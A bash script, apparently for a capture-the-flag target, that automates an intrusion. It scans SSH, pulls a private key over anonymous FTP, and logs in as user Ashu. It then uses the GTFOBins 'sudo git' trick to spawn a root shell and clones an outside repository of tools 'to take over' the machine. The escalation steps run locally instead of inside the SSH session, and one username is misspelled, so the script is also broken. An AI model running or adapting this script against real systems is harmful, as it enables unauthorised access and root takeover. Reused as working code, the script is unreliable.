#!/bin/bash

# Prompt for IP address
read -p "Enter the IP address: " ip_address

# Basic enumeration to obtain Ashu's password/ssh id_rsa key
echo "Basic enumeration in progress..."
if ! nmap -p 22 --script ssh2-enum-algos "$ip_address"; then
  echo "Failed to perform basic enumeration."
  exit 1
fi
sleep 4
# Connect to the machine as user Ashu and download id_rsa file
echo "Connecting to $ip_address as user ftp and downloading id_rsa..."
if ! ftp -n "$ip_address" << EOF
user ftp
get id_rsa
quit
EOF
then
  echo "Failed to connect as user ftp or download id_rsa file."
  exit 1
fi
sleep 4
# Change id_rsa permissions to 600
echo "Changing id_rsa permissions to 600..."
if ! chmod 600 id_rsa; then
  echo "Failed to change id_rsa permissions."
  exit 1
fi
# Connect to SSH using id_rsa
echo "Connecting to $ip_address using id_rsa key..."
if ! ssh -i id_rsa -o StrictHostKeyChecking=no Ashu@"$ip_address"; then
  echo "Failed to connect using id_rsa key."
  exit 1
fi
sleep 4
# Check sudo privileges for user skiddy

# Elevate to user skiddy shell
echo "Elevating to user skiddy shell..."
if ! sudo su -c "echo 'Elevated to user skiddy shell.'" skidy; then
  echo "Failed to elevate to user skiddy shell."
  exit 1
fi

# Confirm sudo privileges to run git as sudo
echo "Checking sudo privileges for running git..."
if ! sudo -l | grep -i "git"; then
  echo "Failed to check sudo privileges for running git."
  exit 1
fi
sleep 4
# Exploit GTFObins to obtain root shell
echo "Exploiting GTFObins to gain root shell..."
if ! sudo git -p help config | /bin/sh; then
  echo "Failed to exploit GTFObins to gain root shell."
  exit 1
fi

sleep 4
echo "Cloning tools to take over"
if ! sudo git clone https://github.com/Le-Bullwhale/deploy.git; then
echo "failed to deploy tools"
exit 1
fi 

echo "Script execution completed."
